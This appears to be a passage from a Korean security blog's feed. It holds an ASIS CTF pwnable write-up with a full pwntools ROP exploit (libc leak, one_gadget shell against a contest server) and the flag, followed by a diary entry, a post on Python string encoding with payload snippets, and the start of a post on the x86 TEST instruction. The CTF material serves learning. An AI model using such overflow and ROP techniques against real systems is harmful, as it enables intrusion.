class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)alloca(atoi(size) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloca</code> 함수는 스택에 메모리를 할당하는 함수이다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>포맷스트링 인자를 마음대로 줄 수 있으니 입력으로 0을 넣으면 stack overflow를 트리거할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%0s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><p>same as</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>%0s</code> 포맷스트링으로 overflow 트리거</li><li>원가젯</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">13370</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401433</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0xe3b01</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Another-Solve"><a href="#Another-Solve" class="headerlink" title="Another Solve"></a>Another Solve</h2><h3 id="1-Using-FSB"><a href="#1-Using-FSB" class="headerlink" title="1. Using FSB"></a>1. Using FSB</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1$999&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe3b4d0ac8 → 0x73393939243125 (&quot;%1$999s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe3b4d0ab0 → 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe3b4d0ab0 → 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Maybe.. I think this solution is intention.</p><h3 id="2-Using-rsi-x3D-x3D-rdx"><a href="#2-Using-rsi-x3D-x3D-rdx" class="headerlink" title="2. Using rsi &#x3D;&#x3D; rdx"></a>2. Using rsi &#x3D;&#x3D; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1s%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> </span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe99d75878 → 0x00007325733125 (&quot;%1s%s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe99d75860 → 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe99d75860 → 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;06e5ff13b438f5d6626a97758fddde3e502fe3fc&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASIS CTF </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-14 Diary</title>
      <link href="/221014-diary/"/>
      <url>/221014-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="블로그-관련"><a href="#블로그-관련" class="headerlink" title="블로그 관련"></a>블로그 관련</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>댓글 기능을 추가했다. </p><p>전에 잠깐 운영했던 블로그는 utterances을 사용했었다. Github의 issue로 댓글을 관리할 수 있다는 점이 매력적이었지만 Github 계정이 있어야만 댓글을 등록할 수 있다는 점이 마음에 들지 않았다. 그래도 마크다운도 지원하고 나름 ui도 예뻐서 계속 사용하고 싶었으나 내가 원하는 기능이 구현되어 있지 않았다. 바로 reaction 기능인데, tistory에 하트로 공감 누르는.. 그런 기능을 원했지만 utterances에는 그런 기능이 없었다. hexo plugin을 찾아봤지만 찾아보기가 힘들었다. 그러다가 giscus라는 것을 발견했다.</p><p>giscus는 utterances와 매우 유사하다. utterances에서 대댓글 기능을 추가했다. 또한 내가 원하는 reaction 기능이 있었다! 그래서 바로 giscus를 적용하려고 했으나 익명인 상태에선 댓글과 reaction을 할 수 없다는 것이 은근 거슬렸다. </p><p>그래서 결국 disqus를 이용하기로 했다. 광고가 붙는다는 사실때문에 사용하기 꺼려졌었는데, 잠깐 서치해본 결과 광고는 일일 조회수에 영향을 받는 것 같았다. 정확한 수치는 기억이 나지 않지만 이정도면 광고 붙을 걱정을 하지 않아도 될 것 같다고 판단했다. ㅋㅋ </p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>Search 탭을 추가했다. 정적으로 탐색해서 속도가 짱짱 빠르다. 매우 마음에 든다. 내가 자주 쓸 것 같다.</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>Sitemap 등록을 했다. 전에 잠깐 운영했던 블로그에도 Sitemap 등록을 했었는데 그 흔적이 아직 남아있다 T.T 삭제하고 재등록을 했음에도.. 흑흑<br>색인이 제대로 생성되지 않아 유효성 검사를 요청했다. 오래 걸릴 수도 있다고 한다. </p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Deal With Strings in Python</title>
      <link href="/221013-python3-String/"/>
      <url>/221013-python3-String/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Python에서서의 문자열 인코딩 방식을 설명하기 위해 <code>ASCII</code>와 <code>Unicode</code>에 대해 간단히 설명한다. Python2에서는 디폴트 인코딩 방식이 <code>ASCII</code>이지만 Python3에서는 <code>UTF-8</code>을 채택했다. <code>UTF-8</code>은 <code>Unicode</code> 인코딩 방식 중 하나로 전세계에서 널리 쓰이는 인코딩 방식이다.</p><p>Python2와 Python3에서 문자열을 다루는 방식이 바뀌었으므로, payload를 작성할 때 Python2에 익숙한 player가 Python3를 사용하기 위해서는 Unicode로 인코딩한 byte 문자열과 일반 문자열의 차이를 알고 있어야 한다.</p><h2 id="ASCII와-Unicode"><a href="#ASCII와-Unicode" class="headerlink" title="ASCII와 Unicode"></a>ASCII와 Unicode</h2><p><code>ASCII</code>와 <code>Unicode</code>에 대해 간단히 알아보자.</p><h3 id="아스키-ASCII-American-Standard-Code-for-Information-Interchange"><a href="#아스키-ASCII-American-Standard-Code-for-Information-Interchange" class="headerlink" title="아스키 (ASCII, American Standard Code for Information Interchange)"></a>아스키 (ASCII, American Standard Code for Information Interchange)</h3><ul><li>1960년대 미국에서 정의한 표준화한 부호체계</li></ul><p><code>ASCII 코드</code>는 7bit 즉, 128(&#x3D;2^7)개의 고유한 값만 사용한다. 컴퓨터의 기본 저장 단위는 1byte(&#x3D;8bits)인데, <code>ASCII 코드</code>는 7bit만 사용한다. 나머지 1bit는 Parity Bit인데, 이는 통신 에러 검출을 의미한다.</p><p>10진수로 0부터 127, 16진수로 0x00부터 0x7F의 범위로 문자열 Char 즉, 고유값을 표현할 수 있다.</p><p>7bit로 표현할 수 있는 <code>ASCII 코드</code>는 ‘영문’만을 표현할 수 있다. 다른 언어를 표현하기에는 7bit로는 역부족이었다. 그래서 8bits로 확장한 아스키 코드가 등장했는데, 이를 <code>ANSI 코드</code>라고 부르기로 했다더라.</p><p><code>ANSI 코드</code>는 8bits로 표현할 수 있으니 256(&#x3D;2^8)개의 값을 쓸 수 있는데, 여전히 ‘한글’을 포함한 비유럽 국가의 문자를 표현하기에는 역부족이었다. 그래서 <code>유니코드 (Unicode)</code>라는 전 세계 언어의 문자를 정의하기 위한 국제 표준 코드가 등장했다.</p><h3 id="유니코드-Unicode"><a href="#유니코드-Unicode" class="headerlink" title="유니코드 (Unicode)"></a>유니코드 (Unicode)</h3><p><code>유니코드</code>는 <code>ASCII 코드</code>나 <code>ANSI 코드</code>보다 훨씬 크게 용량을 2byte(&#x3D;2^16, 65536)로 확장한 코드이다. 무려 65536(&#x3D;2^16)개나 문자를 저장할 수 있었다. 참고로 <code>유니코드 3.0버전</code>까지는 이를 <code>기본 언어판 (BMP, Basic Multilingual Plane)</code>이라고 불렀다. 비트맵이 아니다.</p><p>0x0000부터 0xFFFF까지 표현이 가능하다.</p><p>하지만 이는 또 세상의 모든 언어를 감당하기가 힘들었다. 그래서 <code>유니코드 3.0버전</code>부터 <code>보충 언어판 (Supplementary Plane)</code>을 정의했다. 이때 한자가 가장 많이 할당받았다고 한다. 그런데 이것은 bit로 어떻게 표현할 수 있을까?</p><p>사실 <code>기본 언어판</code>에는 대행코드 영역이란 것이 존재한다. 상위 대행코드와 하위 대행코드를 조합해서 <code>보충 언어판</code>의 문자를 표현한다. 즉, 2byte가 꼭 한 개의 문자를 의미하는 것은 아니다. 한개를 읽어보고 대행코드이면 그 다음 한개를 더 읽어 한 문자를 완성한다. </p><p><code>기본 언어판</code>의 대행코드 영역은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">상위 대행코드 (High Surrogates) : D800 - DBFF</span><br><span class="line">하위 대행코드 (Low Surrogates) : DC00 - DFFF</span><br></pre></td></tr></table></figure><p>정리하자면 <code>유니코드는 2byte로만 표현할 수 있다.</code>는 완전히 틀린 소리이다. 결국 <code>유니코드</code>는 모든 문자에 index(Unidocde code point, 고유한 값)를 부여한 것이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27;라는 글자는 0x0041(U+0041)이라는 index를 가진다.</span><br><span class="line">&#x27;a&#x27;라는 글자는 0x0061(U+0061)이라는 index를 가진다.</span><br><span class="line">&#x27;가&#x27;라는 글자는 0xAC00(U+AC00)이라는 index를 가진다.</span><br></pre></td></tr></table></figure><p>참고로 <code>U+</code>라는 접두어가 붙어있으면 <code>유니코드</code>라는 의미이다. <code>U+0000 ~ U+007F</code>로 <code>ASCII</code> 문자를 모두 표현할 수 있다. 참고로 <code>U+AC00 ~ U+D7AF</code>로 한글 음절을 표현할 수 있다.</p><h2 id="유니코드를-표현하는-방법"><a href="#유니코드를-표현하는-방법" class="headerlink" title="유니코드를 표현하는 방법"></a>유니코드를 표현하는 방법</h2><p><code>유니코드</code>의 index를 표현하는 방법에 대해 알아보자. 이러한 index는 여러 형식으로 변환될 수 있는데, 그 중 개인적으로 가장 익숙한 <code>UTF-8</code> 인코딩을 알아봤다. </p><p>그 전에 궁금증이 있다. index를 바로 컴퓨터에 저장하면 안되는 걸까? 왜 컴퓨터에 저장하기 위해서 또 변환을 해야할까? 용량때문이다. 예를 들어, 1byte로 충분히 표현할 수 있는 A를 굳이 2byte로 저장한다면 용량 문제가 생길 것이다. 호환이 잘되고 용량을 적게 만들기 위해 유니코드의 index(숫자)를 컴퓨터에 효과적으로 할당해서 0과 1로 표현할 지 결정하는 <code>인코딩 방식</code>이 필요하다. </p><h3 id="UTF-8-가변길이-인코딩-Unicode-Transformation-Format"><a href="#UTF-8-가변길이-인코딩-Unicode-Transformation-Format" class="headerlink" title="UTF-8 (가변길이 인코딩, Unicode Transformation Format)"></a>UTF-8 (가변길이 인코딩, Unicode Transformation Format)</h3><p><code>유니코드</code>가 인터페이스라면 <code>UTF-8</code>은 구현체라고 할 수 있다. <code>UTF-8</code>은 8bit 문자 인코딩 형식으로 <code>유니코드</code> 문자를 index에 따라 8bit(&#x3D;1byte) ~ 4byte로 변환한다. </p><p><code>UTF-8</code>은 가변바이트를 사용하기 때문에, 1byte로 표현이 충분한 A는 0x41로 표현한다. 이는 <code>UTF-8</code>과 <code>ASCII 코드</code>와 영문 영역에서는 100% 호환된다는 것을 의미한다. </p><h4 id="Code-point-↔-UTF-8-conversion"><a href="#Code-point-↔-UTF-8-conversion" class="headerlink" title="Code point ↔ UTF-8 conversion"></a>Code point ↔ UTF-8 conversion</h4><table><thead><tr><th align="right">First code point</th><th align="right">Last code point</th><th>Byte 1</th><th>Byte 2</th><th>Byte 3</th><th>Byte 4</th></tr></thead><tbody><tr><td align="right">U+0000</td><td align="right">U+007F</td><td>0xxxxxxx</td><td></td><td></td><td></td></tr><tr><td align="right">U+0080</td><td align="right">U+07FF</td><td>110xxxxx</td><td>10xxxxxx</td><td></td><td></td></tr><tr><td align="right">U+0800</td><td align="right">U+FFFF</td><td>1110xxxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td></td></tr><tr><td align="right">U+10000</td><td align="right">U+10FFFF</td><td>11110xxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td>10xxxxxx</td></tr></tbody></table><p>출처: <a href="https://en.wikipedia.org/wiki/UTF-8">https://en.wikipedia.org/wiki/UTF-8</a></p><p>위와 같이 <code>유니코드</code> 범위에 따라 <code>UTF-8</code> 인코딩의 byte 개수가 정해진다. 참고로 한글은 3byte로 표현된다.</p><h2 id="Python에서서의-문자열-인코딩"><a href="#Python에서서의-문자열-인코딩" class="headerlink" title="Python에서서의 문자열 인코딩"></a>Python에서서의 문자열 인코딩</h2><p>컴퓨터가 저장할 수 유일한 것은 byte이다. 그래서 인코딩 즉, byte로 변환해야하는 과정을 거쳐야 한다. Python에서의 문자열 인코딩 방식을 알아보자.</p><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a>Python2</h3><p>Python2에서는 <code>ASCII</code>가 디폴트 인코딩 방법으로 되어있다. <code>ASCII</code>로는 한글을 표현할 수 없으므로, 한글을 표현하기 위해서 아래의 코드를 코드 맨 윗줄에 따로 명시해야한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure><h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3><p>Python3에서는 <code>UTF-8</code>이 디폴트 인코딩 방법이다. 그래서 모든 문자열은 <code>유니코드</code>로 처리된다. <code>b&#39;&#39;</code>는 byte임을 의미한다. 디폴트로 <code>UTF-8</code>로 인코딩되어 byte 문자열로 표현했으므로 이것을 다시<code>.decode()</code>하면 <code>UTF-8</code>로 디코딩하여 문자열로 표현할 수 있다. </p><p>정리하면 인코딩 방식만 알면 byte 문자열을 다시 문자열로 디코딩할 수 있다는 의미다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b&#x27;jir4vvit&#x27;</span><br><span class="line">b&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;bytes&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; b&#x27;jir4vvit&#x27;.decode()</span><br><span class="line">&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>요즘 Pwnable을 풀 때 Python3으로 작성하고 있다. 이것을 헷갈리고 가장 처음에 했던 실수는 아래와 같다. 지금 생각해보면 왜 이렇게 했었는지 이해가 안간다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str(b&#x27;jir4vvit&#x27;)</span><br><span class="line">&quot;b&#x27;jir4vvit&#x27;&quot;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>문자열에 대한 이해를 제대로 하지 않고 저지른 실수이다. Python3니까 어디서 많이 본 <code>b&#39;&#39;</code>으로 문자열을 감싸고 이걸 <code>str()</code>로 감싸서 <code>p.send()</code>했었다. </p><p><strong>여러 시도 끝에 마음편하게 byte 문자열로 payload를 구성하기로 했다.</strong></p><p>아래처럼 문자열로 payload를 구성하면 될 때도 있고 안될 때도 있다. 되는 건 운이 좋은 때고, 안될 때는 에러가 발생한다. (안되는 경우가 더 많을 것 같다.)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += &#x27;A&#x27; * 0x50</span><br><span class="line">payload += &#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27; # rbp</span><br><span class="line">payload += &#x27;\x83\x0c\x40\x00\x00\x00\x00\x00&#x27; # pop rdi</span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;]).decode()</span><br><span class="line">payload += &#x27;\xe0\x06\x40\x00\x00\x00\x00\x00&#x27; # puts plt</span><br><span class="line">payload += p64(main).decode()</span><br></pre></td></tr></table></figure><p>실제로 아래와 같은 디코드가 안된다는 에러를 받았었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/jir4vvit/ex.py&quot;, line 99, in &lt;module&gt;</span><br><span class="line">    payload += p64(binsh).decode()</span><br><span class="line">UnicodeDecodeError: &#x27;utf-8&#x27; codec can&#x27;t decode byte 0xcf in position 1: invalid continuation byte</span><br></pre></td></tr></table></figure><p>마음편히 byte로 보내면 저런 디코딩 에러를 만날 일이 없다. pwntools는 기본적으로 byte로 처리하기 때문에 payload를 아래처럼 byte로 작성해주면 정말정말 디코딩 에러를 만날 일이 없다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += b&#x27;A&#x27; * 0x50</span><br><span class="line">payload += p64(0) # rbp</span><br><span class="line">payload += p64(pop_rdi) </span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;])</span><br><span class="line">payload += p64(e.symbols[&#x27;puts])</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure><p>또한 Python2와 다르게 byte 문자열과 문자열을 혼합해서 작성할 수 없다. 일관되게 작성해야 한다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://whatisthenext.tistory.com/103">https://whatisthenext.tistory.com/103</a></li><li><a href="https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0">https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0</a></li><li><a href="https://finebe.tistory.com/42">https://finebe.tistory.com/42</a></li><li><a href="https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0">https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0</a></li></ul><p>이 글을 작성할 당시엔 댓글기능이 없다. 틀린 말이나 첨언이 있다면 메일 한 통 부탁드립니다. 메일 주소는 <a href="https://jiravvit.github.io/">블로그 메인 화면</a> 에서 찾을 수 있습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> string </tag>
            
            <tag> Unicode </tag>
            
            <tag> ASCII </tag>
            
            <tag> byte </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>What does the &#39;TEST&#39; instruction do</title>
      <link href="/221013-test-instruction/"/>
      <url>/221013-test-instruction/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>어셈블리어에서 <code>TEST</code> 명령어는 <code>eax</code>의 값이 0이냐 아니냐를 판단하기 위해서 사용한다. 만약 <code>eax</code>의 값이 0이라면 (<code>zf</code>가 세팅되어) 뒤에 <code>JE</code>나 <code>JZ</code> 명령어가 온다면 jump한다.</p><h2 id="TEST-명령어"><a href="#TEST-명령어" class="headerlink" title="TEST 명령어"></a>TEST 명령어</h2><p>문제를 풀다가 언제 jump하는지 항상 헷갈려서 블로그에 정리하려고 한다..</p><p>아래는 예시 어셈블리어이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000131E</span><br><span class="line">.text:0000131E loc_131E:</span><br><span class="line">.text:0000131E lea     eax, (var - 4000h)[ebx]</span><br><span class="line">.text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br><span class="line">.text:0000132A xor     eax, 11h</span><br><span class="line">.text:0000132D or      eax, edx</span><br><span class="line">.text:0000132F test    eax, eax</span><br><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><p>간단하다.</p><p><code>test    eax, eax</code> 에서 <code>eax</code>가 0인지 판단하고, 만약 0이라면 <code>zf</code>가 1로 세팅된다. <code>jnz(=jump not zero)</code> 명령어는 이름 그대로 0이 아닐 경우 jump하기 때문에 <code>eax</code>가 0이라면 jump하지 않는다. </p><p>하지만 문제 풀 때 의외로 많이 헷갈렸으므로 이 로직을 조금 더 뜯어보자.</p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br></pre></td></tr></table></figure><ul><li>이 연산은 <code>edx</code>와 <code>eax</code> 주소에 값을 저장하는 연산이다.</li><li>사용자 인풋은 <code>eax</code> 주소에 저장된다. bss영역 정의된 배열에 값을 쓰는데 어째선지 배열의 사이즈를 모르는 상황이다.</li><li><code>edx</code>에 배열 밖의 값이 저장된다는 사실을 파악해보자.</li></ul><h3 